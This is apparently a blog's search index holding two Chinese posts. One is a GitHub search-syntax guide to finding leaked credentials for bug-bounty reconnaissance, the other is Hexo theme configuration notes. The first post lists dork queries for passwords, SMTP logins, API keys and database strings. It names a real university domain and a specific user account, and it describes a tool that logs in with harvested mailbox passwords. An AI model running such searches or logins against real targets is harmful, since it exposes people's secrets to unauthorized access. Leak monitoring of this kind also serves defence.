<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Github语法</title>
    <url>/posts/a1b49219/</url>
    <content><![CDATA[<p>通过Github来获取一些敏感信息，来帮助测试或者SRC资产收集。。</p>
<a id="more"></a>

<h2 id="0x00-GitHub语法"><a href="#0x00-GitHub语法" class="headerlink" title="0x00 GitHub语法"></a>0x00 GitHub语法</h2><p>通过Github来获取一些敏感信息，来帮助测试或者SRC资产收集。。</p>
<h2 id="0x02-Code基础语法"><a href="#0x02-Code基础语法" class="headerlink" title="0x02 Code基础语法"></a>0x02 Code基础语法</h2><p>基础：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">extension 限定符匹配具有特定文件扩展名的代码文件。 <span class="comment"># extension:py</span></span><br><span class="line">filename  限定符匹配具有特定文件名的代码文件。		<span class="comment"># filename:password</span></span><br><span class="line">size			限定符基于代码所在文件的大小搜索源代码。<span class="comment"># size:10 &#123;默认KB&#125;，size:&gt;10 &#123;大于、小于和范围限定符&#125;</span></span><br><span class="line">language	基于所编写的语言搜索代码。							<span class="comment"># language:python</span></span><br><span class="line">path 			限定符搜索仓库中特定位置显示的源代码。		<span class="comment"># path:/	path:app/public </span></span><br><span class="line">user/org	特定用户或组织拥有的所有仓库中搜索代码		<span class="comment"># user:defunkt , org:github</span></span><br><span class="line"><span class="keyword">in</span>				限定符可以将搜索限制为源代码文件的内容、文件路径或两者。 <span class="comment"># in:file  in:path</span></span><br></pre></td></tr></table></figure>

<p>重点参数：</p>
<ul>
<li><code>in</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">in</span>:file		<span class="keyword">in</span>:file password 匹配文件中含有password</span><br><span class="line"><span class="keyword">in</span>:path		<span class="keyword">in</span>:path password 匹配项目路径中含有password</span><br><span class="line"><span class="keyword">in</span>:name <span class="built_in">test</span>               仓库标题搜索含有关键字 SpringCloud</span><br><span class="line"><span class="keyword">in</span>:descripton <span class="built_in">test</span>         仓库描述搜索含有关键字</span><br><span class="line"><span class="keyword">in</span>:readme <span class="built_in">test</span>             Readme文件搜素含有关键字</span><br><span class="line"><span class="keyword">in</span>:title	warning <span class="keyword">in</span>:title 匹配其标题中含有 <span class="string">&quot;warning&quot;</span> 的议题。</span><br><span class="line"><span class="keyword">in</span>:body		error <span class="keyword">in</span>:title,body 匹配其标题或正文中含有 <span class="string">&quot;error&quot;</span> 的议题。</span><br><span class="line"><span class="keyword">in</span>:comments		shipit <span class="keyword">in</span>:comments 匹配其评论中提及 <span class="string">&quot;shipit&quot;</span> 的议题。</span><br></pre></td></tr></table></figure>

<ul>
<li><code>is</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">is:pr			event is:pr 匹配含有 <span class="string">&quot;event&quot;</span> 字样的拉取请求。</span><br><span class="line">is:issue	is:issue label:bug is:closed 匹配具有标签 <span class="string">&quot;bug&quot;</span> 的已关闭议题。</span><br><span class="line">is:open		performance is:open is:issue 匹配含有 <span class="string">&quot;performance&quot;</span> 字样的开放议题。</span><br><span class="line">is:closed		android is:closed 匹配含有 <span class="string">&quot;android&quot;</span> 字样的已关闭议题和拉取请求。</span><br><span class="line">is:public		is:public 匹配所有公共仓库中的议题和拉取请求。</span><br><span class="line">is:private	is:private cupcake 匹配您具有访问权限的私有仓库中含有 <span class="string">&quot;cupcake&quot;</span> 字样的议题和拉取请求。</span><br><span class="line">is:merged			bugfix is:pr is:merged 匹配含有 <span class="string">&quot;bugfix&quot;</span> 字样的已合并拉取请求。</span><br><span class="line">is:unmerged		error is:unmerged 匹配含有 <span class="string">&quot;error&quot;</span> 字样的已关闭议题和拉取请求。</span><br><span class="line">is:locked		code of conduct is:locked is:issue archived:<span class="literal">false</span> 匹配未存档仓库中具有已锁定对话且含有 <span class="string">&quot;code of conduct&quot;</span> 字样的议题或拉取请求。</span><br><span class="line">is:unlocked	code of conduct is:unlocked is:issue archived:<span class="literal">false</span> 匹配未存档仓库中具有未锁定对话且含有 <span class="string">&quot;code of conduct&quot;</span> 字样的议题或拉取请求。</span><br></pre></td></tr></table></figure>

<h3 id="按文件内容或文件路径搜索"><a href="#按文件内容或文件路径搜索" class="headerlink" title="按文件内容或文件路径搜索"></a><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vY24vZ2l0aHViL3NlYXJjaGluZy1mb3ItaW5mb3JtYXRpb24tb24tZ2l0aHViL3NlYXJjaGluZy1jb2RlI3NlYXJjaC1ieS10aGUtZmlsZS1jb250ZW50cy1vci1maWxlLXBhdGg=">按文件内容或文件路径搜索<i class="fa fa-external-link-alt"></i></span></h3><p>使用 <code>in</code> 限定符，您可以将搜索限制为源代码文件的内容、文件路径或两者。 如果省略此限定符，则只搜索文件内容。</p>
<ul>
<li>必须登录才能跨所有公共仓库搜索代码。</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vY24vYXJ0aWNsZXMvYWJvdXQtZm9ya3M=">复刻<i class="fa fa-external-link-alt"></i></span>中的代码仅当复刻的星号超过父级仓库时可搜索。 星号少于父仓库的复刻<strong>不</strong>为代码搜索编索引。 要在搜索结果中包括星号比其父项多的复刻，您需要将 <code>fork:true</code> 或 <code>fork:only</code> 添加到查询。 更多信息请参阅“<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vY24vYXJ0aWNsZXMvc2VhcmNoaW5nLWluLWZvcmtz">在复刻中搜索<i class="fa fa-external-link-alt"></i></span>”。</li>
<li>只有<em>默认分支</em>编索引进行代码搜索。 在大多数情况下，这将成为 <code>master</code> 分支。</li>
<li>只有小于 384 KB 的文件可搜索。</li>
<li>只有少于 500,000 个文件的仓库可搜索。</li>
<li>登录的用户可以搜索所有公共仓库。</li>
<li>除了 <a href="https://docs.github.com/cn/github/searching-for-information-on-github/searching-code#search-by-filename"><code>filename</code></a> 搜索以外，搜索源代码时必须始终包括至少一个搜索词。 例如，搜索 <a href="https://github.com/search?utf8=%E2%9C%93&q=language:javascript&type=Code&ref=searchresults"><code>language:javascript</code></a> 无效，而搜索 <a href="https://github.com/search?utf8=%E2%9C%93&q=amazing+language:javascript&type=Code&ref=searchresults"><code>amazing language:javascript</code></a> 有效。</li>
<li>搜索结果最多可显示同一文件的两个分段，但文件内可能有更多结果。</li>
<li>您无法使用以下通配符作为搜索查询的一部分：<code>. , : ; / \ </code> ‘ “ = * ! ? # $ &amp; + ^ | ~ &lt; &gt; ( ) { } [ ]`. 搜索只会忽略这些符号。</li>
</ul>
<table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>in:file</code></td>
<td><a href="https://github.com/search?q=octocat+in:file&type=Code"><strong>octocat in:file</strong></a> 匹配文件内容中出现 “octocat” 的代码。</td>
</tr>
<tr>
<td><code>in:path</code></td>
<td><a href="https://github.com/search?q=octocat+in:path&type=Code"><strong>octocat in:path</strong></a> 匹配文件路径中出现 “octocat” 的代码。</td>
</tr>
<tr>
<td></td>
<td><a href="https://github.com/search?q=octocat+in:file,path&type=Code"><strong>octocat in:file,path</strong></a> 匹配文件内容或文件路径中出现 “octocat” 的代码。</td>
</tr>
</tbody></table>
<p>示例：</p>
<p><img src="/posts/a1b49219/0001.png"></p>
<h3 id="在用户或组织的仓库内搜索"><a href="#在用户或组织的仓库内搜索" class="headerlink" title="在用户或组织的仓库内搜索"></a><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vY24vZ2l0aHViL3NlYXJjaGluZy1mb3ItaW5mb3JtYXRpb24tb24tZ2l0aHViL3NlYXJjaGluZy1jb2RlI3NlYXJjaC13aXRoaW4tYS11c2Vycy1vci1vcmdhbml6YXRpb25zLXJlcG9zaXRvcmllcw==">在用户或组织的仓库内搜索<i class="fa fa-external-link-alt"></i></span></h3><p>要在特定用户或组织拥有的所有仓库中搜索代码，您可以使用 <code>user</code> 或 <code>org</code> 限定符。 要在特定仓库中搜索代码，您可以使用 <code>repo</code> 限定符。</p>
<table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>user:*USERNAME*</code></td>
<td><a href="https://github.com/search?q=user:github+extension:rb&type=Code"><strong>user:defunkt extension:rb</strong></a> matches code from @defunkt that ends in <em>.rb</em>.</td>
</tr>
<tr>
<td><code>org:*ORGNAME*</code></td>
<td><a href="https://github.com/search?utf8=%E2%9C%93&q=org:github+extension:js&type=Code"><strong>org:github extension:js</strong></a> matches code from GitHub that ends in <em>.js</em>.</td>
</tr>
<tr>
<td><code>repo:*USERNAME/REPOSITORY*</code></td>
<td><a href="https://github.com/search?q=repo:mozilla/shumway+extension:as&type=Code"><strong>repo:mozilla/shumway extension:as</strong></a> matches code from @mozilla’s shumway project that ends in <em>.as</em>.</td>
</tr>
</tbody></table>
<p><img src="/posts/a1b49219/0002.png"></p>
<h3 id="按语言搜索"><a href="#按语言搜索" class="headerlink" title="按语言搜索"></a><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vY24vZ2l0aHViL3NlYXJjaGluZy1mb3ItaW5mb3JtYXRpb24tb24tZ2l0aHViL3NlYXJjaGluZy1jb2RlI3NlYXJjaC1ieS1sYW5ndWFnZQ==">按语言搜索<i class="fa fa-external-link-alt"></i></span></h3><p>您可以基于所编写的语言搜索代码。</p>
<table>
<thead>
<tr>
<th>限定符</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>language:*LANGUAGE*</code></td>
<td><a href="https://github.com/search?q=element+language:xml+size:100&type=Code"><strong>element language:xml size:100</strong></a> 匹配标记为 XML 且恰好有 100 个字节的并含有 “element” 字样的代码。</td>
</tr>
<tr>
<td></td>
<td><a href="https://github.com/search?q=display+language:scss&type=Code"><strong>display language:scss</strong></a> 匹配标记为 SCSS 且含有 “display” 字样的代码。</td>
</tr>
<tr>
<td></td>
<td><a href="https://github.com/search?utf8=%E2%9C%93&q=org:mozilla+language:markdown&type=Code"><strong>org:mozilla language:markdown</strong></a> 匹配标记为 Markdown 且来自所有 @mozilla 仓库的代码。</td>
</tr>
</tbody></table>
<p><img src="/posts/a1b49219/0004.png" alt="image-20200513094616236"></p>
<h2 id="0x03-实战搜索"><a href="#0x03-实战搜索" class="headerlink" title="0x03 实战搜索"></a>0x03 实战搜索</h2><h3 id="数据库搜索"><a href="#数据库搜索" class="headerlink" title="数据库搜索"></a>数据库搜索</h3><p>根据端口号即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jdbc 3306 password</span><br><span class="line">jdbc 1433 </span><br><span class="line">jdbc 1521 password</span><br><span class="line">6379 password</span><br><span class="line">...</span><br><span class="line">&#123;3389 password&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a1b49219/0005.png" alt="image-20200515100126043"></p>
<h3 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smtp @qq.com password</span><br><span class="line">smtp @163.com password</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a1b49219/0006.png" alt="image-20200513111154874"></p>
<h3 id="字符串搜索"><a href="#字符串搜索" class="headerlink" title="字符串搜索"></a>字符串搜索</h3><p>指定字符串搜索。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mogujie password </span><br><span class="line">gmail password</span><br><span class="line">fofa_key</span><br><span class="line">shodan_api_key</span><br><span class="line">sina.com password</span><br><span class="line">mysql_password</span><br><span class="line">svn password</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a1b49219/0007.png" alt="image-20200513113724070"></p>
<h3 id="根据公司名搜索"><a href="#根据公司名搜索" class="headerlink" title="根据公司名搜索"></a>根据公司名搜索</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Company&quot;</span> password</span><br><span class="line"><span class="string">&quot;Company&quot;</span> ftp</span><br><span class="line"><span class="string">&quot;Company&quot;</span> token</span><br><span class="line"><span class="string">&quot;Company&quot;</span> key</span><br><span class="line"><span class="string">&quot;Company&quot;</span> JDBC</span><br><span class="line"><span class="string">&quot;Company&quot;</span> ssh2_auth_password</span><br><span class="line"><span class="string">&quot;Company&quot;</span> send_keys and send,keys</span><br><span class="line"><span class="string">&quot;Company&quot;</span> connectionString</span><br><span class="line"><span class="string">&quot;Company&quot;</span> security_credentials</span><br><span class="line"><span class="string">&quot;Company&quot;</span> vsphere</span><br><span class="line">&#123;pass,secert,credentials,config,login...&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;sina&quot;</span> language:python password NOT sina123com <span class="comment"># 搜索某公司/组织中编程语言为python 且不包含sina123com的password字符</span></span><br></pre></td></tr></table></figure>

<p>示例：<code>https://github.com/search?p=3&amp;q=%22sina%22+password&amp;type=Code</code></p>
<p><img src="/posts/a1b49219/0008.png" alt="image-20200514164000972"></p>
<h2 id="0x04-划重点"><a href="#0x04-划重点" class="headerlink" title="0x04 划重点"></a>0x04 划重点</h2><p>主要是快速的找到目标的相关信息。</p>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;edu&quot;</span> password</span><br><span class="line"><span class="string">&quot;edu&quot;</span> <span class="built_in">pwd</span></span><br><span class="line"><span class="string">&quot;zju.edu.cn&quot;</span> password</span><br><span class="line"><span class="string">&quot;zju.edu.cn&quot;</span> send_keys</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&quot;zju.edu.cn&quot; send_keys</code></li>
</ul>
<p><img src="/posts/a1b49219/0009.png" alt="image-20200515093802084"></p>
<ul>
<li>根据发现的send_keys去搜索该用户仓库：<code>user:ken20001207  password</code></li>
</ul>
<p><img src="/posts/a1b49219/0010.png" alt="image-20200515093635522"></p>
<h2 id="0x04-工具介绍"><a href="#0x04-工具介绍" class="headerlink" title="0x04 工具介绍"></a>0x04 工具介绍</h2><h3 id="Github-Nuggests"><a href="#Github-Nuggests" class="headerlink" title="Github_Nuggests"></a><strong><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2F6MG5lL0dpdGh1Yl9OdWdnZXN0cw==">Github_Nuggests<i class="fa fa-external-link-alt"></i></span></strong></h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2F6MG5lL0dpdGh1Yl9OdWdnZXN0cw==">https://github.com/az0ne/Github_Nuggests<i class="fa fa-external-link-alt"></i></span></p>
<p>Github_Nuggests自动爬取Github上文件敏感信息泄露，抓取邮箱密码并自动登录邮箱验证，支持126，qq，sina，163邮箱</p>
<p><code>python Nuggests.py 100</code> (100为页数最大一百页) 如果cookies过期，请将Nuggests.py 文件中{Cookies:xxxxx}换成你github账号登陆的Cookie。</p>
<p><strong>核心代码：</strong></p>
<p><img src="/posts/a1b49219/0011.png" alt="image-20200515104306556"></p>
<p>分析：</p>
<ul>
<li><p>首先根据规则<code>smtp+163.com</code>爬取,然后匹配所有的<code>a</code>标签,再匹配是否含有<code>blob</code>,然后处理得到最终的地址。</p>
</li>
<li><p>访问最终地址，然后split默认分割，最后查找包含<code>user</code>,<code>pass</code>字符的，并+2输出(这里默认分割为所有的空字符，包括空格、换行(\n)、制表符(\t)等。 username = zhangsan  password =zhangsan!@#)</p>
</li>
<li><p>因此会导致<code>username=zhangsan,password=zhangsan!@#</code>无法识别出来。</p>
</li>
</ul>
<h3 id="theHarvester"><a href="#theHarvester" class="headerlink" title="theHarvester"></a>theHarvester</h3><p>从百度，必应，谷歌，GitHub等收集电子邮件，名称，子域，IP和URL。（部分需要配置API）</p>
<p><img src="/posts/a1b49219/0012.png" alt="image-20200515135959821"></p>
<h3 id="GSIL"><a href="#GSIL" class="headerlink" title="GSIL"></a>GSIL</h3><p><span class="exturl" data-url="aHR0cDovL2dzaWwuZmVlaS5jbi8=">http://gsil.feei.cn/<i class="fa fa-external-link-alt"></i></span></p>
<p>首先要配置<code>config.gsil</code>邮箱，扫描完毕以后会将结果发送到邮件.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[mail]</span><br><span class="line">host : smtp.exmail.qq.com</span><br><span class="line"><span class="comment"># SMTP端口(非SSL端口，但会使用TLS加密)</span></span><br><span class="line">port : <span class="number">25</span></span><br><span class="line"><span class="comment"># 多个发件人使用逗号(,)分隔</span></span><br><span class="line">mails : gsil@feei.cn</span><br><span class="line"><span class="keyword">from</span> : GSIL</span><br><span class="line">password : your_password</span><br><span class="line"><span class="comment"># 多个收件人使用逗号(,)分隔</span></span><br><span class="line">to : feei@feei.cn</span><br><span class="line"></span><br><span class="line">[github]</span><br><span class="line"><span class="comment"># 扫描到的漏洞仓库是否立刻Clone到本地（~/.gsil/codes/）</span></span><br><span class="line"><span class="comment"># 此选项用作监控其它厂商，避免因为仓库所有者发现后被删除</span></span><br><span class="line">clone: false</span><br><span class="line"></span><br><span class="line"><span class="comment"># GitHub Token用来调用相关API，多个Token使用逗号(,)分隔</span></span><br><span class="line"><span class="comment"># https://github.com/settings/tokens</span></span><br><span class="line">tokens : your_token</span><br></pre></td></tr></table></figure>

<p>修改<code>rules.gsil</code>中的扫描规则</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment"># 一级分类，一般使用公司名，用作开启扫描的第一个参数（python gsil.py test）</span></span><br><span class="line">    <span class="string">&quot;test&quot;</span>: &#123;</span><br><span class="line">        <span class="comment"># 二级分类，一般使用产品线</span></span><br><span class="line">        <span class="string">&quot;mogujie&quot;</span>: &#123;</span><br><span class="line">            <span class="comment"># 公司内部域名</span></span><br><span class="line">            <span class="string">&quot;\&quot;mogujie.org\&quot;&quot;</span>: &#123;</span><br><span class="line">                <span class="comment"># mode/ext默认可不填</span></span><br><span class="line">                <span class="string">&quot;mode&quot;</span>: <span class="string">&quot;normal-match&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ext&quot;</span>: <span class="string">&quot;php,java,python,go,js,properties&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment"># 公司代码特征</span></span><br><span class="line">            <span class="string">&quot;copyright meili inc&quot;</span>: &#123;&#125;,</span><br><span class="line">            <span class="comment"># 内部主机域名</span></span><br><span class="line">            <span class="string">&quot;yewu1.db.mogujie.host&quot;</span>: &#123;&#125;,</span><br><span class="line">            <span class="comment"># 外部邮箱</span></span><br><span class="line">            <span class="string">&quot;mail.mogujie.com&quot;</span>: &#123;&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;meilishuo&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;meilishuo.org&quot;</span>: &#123;&#125;,</span><br><span class="line">            <span class="string">&quot;meilishuo.io&quot;</span>: &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Hawkeye"><a href="#Hawkeye" class="headerlink" title="Hawkeye"></a>Hawkeye</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzB4YnVnL0hhd2tleWU=">https://github.com/0xbug/Hawkeye<i class="fa fa-external-link-alt"></i></span></p>
<p>参考：</p>
<p>[1] <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vY24vZ2l0aHViL3NlYXJjaGluZy1mb3ItaW5mb3JtYXRpb24tb24tZ2l0aHViL3NlYXJjaGluZy1vbi1naXRodWI=">https://docs.github.com/cn/github/searching-for-information-on-github/searching-on-github<i class="fa fa-external-link-alt"></i></span></p>
<p>[2] <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1sMFlzRWtfNTlmUQ==">https://www.youtube.com/watch?v=l0YsEk_59fQ<i class="fa fa-external-link-alt"></i></span></p>
<p>[3] <span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzIyOQ==">https://xz.aliyun.com/t/7229<i class="fa fa-external-link-alt"></i></span></p>
<p>[4] <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzB4YnVnL0hhd2tleWU=">https://github.com/0xbug/Hawkeye<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>知识整理</category>
      </categories>
      <tags>
        <tag>Github</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo记录</title>
    <url>/posts/2c0d0e17/</url>
    <content><![CDATA[<p>有关Hexo的踩坑记录，主要是字体、底部信息、文章加密、图片路径处理。截至目前的最新版Next。</p>
<a id="more"></a>.

<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init</span><br><span class="line"></span><br><span class="line"><span class="comment"># git clone https://github.com/iissnan/hexo-theme-next.git themes/next(已经不在维护)</span></span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br><span class="line"></span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<h2 id="二次元人物"><a href="#二次元人物" class="headerlink" title="二次元人物"></a>二次元人物</h2><p><code>npm install --save hexo-helper-live2d</code>对应的模版参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Live2D</span></span><br><span class="line"><span class="comment">## https://github.com/EYHN/hexo-helper-live2d</span></span><br><span class="line">live2d:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  <span class="comment"># enable: false</span></span><br><span class="line">  pluginRootPath: live2dw/ <span class="comment"># Root path of plugin to be on the site (Relative)</span></span><br><span class="line">  pluginJsPath: lib/ <span class="comment"># JavaScript path related to plugin&#x27;s root (Relative)</span></span><br><span class="line">  pluginModelPath: assets/ <span class="comment"># Relative model path related to plugin&#x27;s root (Relative)</span></span><br><span class="line">  scriptFrom: <span class="built_in">local</span> <span class="comment"># Default</span></span><br><span class="line">  <span class="comment"># scriptFrom: jsdelivr # jsdelivr CDN</span></span><br><span class="line">  <span class="comment"># scriptFrom: unpkg # unpkg CDN</span></span><br><span class="line">  <span class="comment"># scriptFrom: https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js # Your custom url</span></span><br><span class="line">  tagMode: <span class="literal">false</span> <span class="comment"># Whether only to replace live2d tag instead of inject to all pages</span></span><br><span class="line">  <span class="built_in">log</span>: <span class="literal">false</span> <span class="comment"># Whether to show logs in console</span></span><br><span class="line">  model:</span><br><span class="line">    <span class="comment">#use: live2d-widget-model-wanko # npm-module package name</span></span><br><span class="line">    use: live2d-widget-model-shizuku</span><br><span class="line">    <span class="comment"># use: live2d-widget-model-miku</span></span><br><span class="line">    <span class="comment"># use: live2d-widget-model-tororo</span></span><br><span class="line">    <span class="comment"># use: live2d-widget-model-tsumiki</span></span><br><span class="line">    <span class="comment"># use: live2d-widget-model-unitychan</span></span><br><span class="line">    <span class="comment"># use: live2d-widget-model-nito</span></span><br><span class="line">    <span class="comment"># use: live2d-widget-model-chitose</span></span><br><span class="line">    <span class="comment"># use: live2d-widget-model-epsilon2_1</span></span><br><span class="line">    <span class="comment"># use: wanko # folder name in (hexo base dir)/live2d_models/</span></span><br><span class="line">    <span class="comment"># use: ./wives/wanko # folder path relative to hexo base dir</span></span><br><span class="line">    <span class="comment"># use: https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json # Your custom url</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="字体设置"><a href="#字体设置" class="headerlink" title="字体设置"></a>字体设置</h2><p>字体设置<code>Next</code>的主题配置文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">font:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Uri of fonts host, e.g. https://fonts.googleapis.com (Default).</span></span><br><span class="line">  host:</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font options:</span></span><br><span class="line">  <span class="comment"># `external: true` will load this font family from `host` above.</span></span><br><span class="line">  <span class="comment"># `family: Times New Roman`. Without any quotes.</span></span><br><span class="line">  <span class="comment"># `size: x.x`. Use `em` as unit. Default: 1 (16px)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Global font settings used for all elements inside &lt;body&gt;.</span></span><br><span class="line">  global:</span><br><span class="line">    external: <span class="literal">true</span></span><br><span class="line">    family: Lato</span><br><span class="line">    <span class="comment"># family: Monda</span></span><br><span class="line">    size:</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for site title (.site-title).</span></span><br><span class="line">  title:</span><br><span class="line">    external: <span class="literal">true</span></span><br><span class="line">    family: Lobster Two</span><br><span class="line">    size:</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for headlines (&lt;h1&gt; to &lt;h6&gt;).</span></span><br><span class="line">  headings:</span><br><span class="line">    external: <span class="literal">true</span></span><br><span class="line">    <span class="comment"># family:</span></span><br><span class="line">    family: Lobster Two</span><br><span class="line">    size:</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for posts (.post-body).</span></span><br><span class="line">  posts:</span><br><span class="line">    external: <span class="literal">true</span></span><br><span class="line">    family: Lobster Two</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Font settings for &lt;code&gt; and code blocks.</span></span><br><span class="line">  codes:</span><br><span class="line">    external: <span class="literal">true</span></span><br><span class="line">    family:  </span><br></pre></td></tr></table></figure>

<h2 id="底部信息修改"><a href="#底部信息修改" class="headerlink" title="底部信息修改"></a>底部信息修改</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Powered by Hexo &amp; NexT</span></span><br><span class="line">powered: <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>底部运行时间以及访问数<code>/themes/next/layout/_partials/footer.swig</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- 网站运行时间的设置 --&gt;</span><br><span class="line">&lt;span id=<span class="string">&quot;timeDate&quot;</span>&gt;载入天数...&lt;/span&gt;</span><br><span class="line">&lt;span id=<span class="string">&quot;times&quot;</span>&gt;载入时分秒...&lt;/span&gt;  </span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createtime</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> grt= <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">&quot;03/03/2020 13:14:21&quot;</span>);<span class="comment">//此处修改你的建站时间或者网站上线时间</span></span><br><span class="line">        now.setTime(now.getTime()+<span class="number">250</span>);</span><br><span class="line">        days = (now - grt ) / <span class="number">1000</span> / <span class="number">60</span> / <span class="number">60</span> / <span class="number">24</span>; dnum = <span class="built_in">Math</span>.floor(days);</span><br><span class="line">        hours = (now - grt ) / <span class="number">1000</span> / <span class="number">60</span> / <span class="number">60</span> - (<span class="number">24</span> * dnum); hnum = <span class="built_in">Math</span>.floor(hours);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">String</span>(hnum).length ==<span class="number">1</span> )&#123;hnum = <span class="string">&quot;0&quot;</span> + hnum;&#125; minutes = (now - grt ) / <span class="number">1000</span> /<span class="number">60</span> - (<span class="number">24</span> * <span class="number">60</span> * dnum) - (<span class="number">60</span> * hnum);</span><br><span class="line">        mnum = <span class="built_in">Math</span>.floor(minutes); <span class="keyword">if</span>(<span class="built_in">String</span>(mnum).length ==<span class="number">1</span> )&#123;mnum = <span class="string">&quot;0&quot;</span> + mnum;&#125;</span><br><span class="line">        seconds = (now - grt ) / <span class="number">1000</span> - (<span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * dnum) - (<span class="number">60</span> * <span class="number">60</span> * hnum) - (<span class="number">60</span> * mnum);</span><br><span class="line">        snum = <span class="built_in">Math</span>.round(seconds); <span class="keyword">if</span>(<span class="built_in">String</span>(snum).length ==<span class="number">1</span> )&#123;snum = <span class="string">&quot;0&quot;</span> + snum;&#125;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;timeDate&quot;</span>).innerHTML = <span class="string">&quot;本站已安全运行 &quot;</span>+dnum+<span class="string">&quot; 天 &quot;</span>;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;times&quot;</span>).innerHTML = hnum + <span class="string">&quot; 小时 &quot;</span> + mnum + <span class="string">&quot; 分 &quot;</span> + snum + <span class="string">&quot; 秒&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">setInterval</span>(<span class="string">&quot;createtime()&quot;</span>,<span class="number">250</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>配置底部访问<code>themes\next\_config.yml</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: true</span><br><span class="line">  total_visitors: true</span><br><span class="line">  total_visitors_icon: user</span><br><span class="line">  total_views: true</span><br><span class="line">  total_views_icon: eye</span><br><span class="line">  post_views: true</span><br><span class="line">  post_views_icon: eye</span><br></pre></td></tr></table></figure>

